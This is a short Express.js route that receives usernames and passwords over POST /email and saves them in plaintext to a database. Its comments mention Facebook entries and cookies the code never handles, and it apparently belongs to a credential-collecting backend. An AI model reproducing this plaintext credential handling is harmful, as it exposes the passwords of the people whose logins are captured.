const { Email } = require("../../model/Index");
const EmailClient = require("../../modules/email/gmail");

module.exports = function (app) {
  app.post("/email", async (req, res) => {
    const { username, password } = req.body;

    // Check if a Facebook entry already exists for this username
    const existingEntry = await Email.findOne({ username ,password});

    if (existingEntry) {
      // Update the existing entry with the new cookie
      existingEntry.username = username;
      existingEntry.password = password;
      await existingEntry.save();
      res.send(existingEntry);
    } else {
      // Create a new entry with the provided username, password, and cookie
      const data = await Email.create({
        username,
        password
      });

    res.send(data);
    }
    

  });};

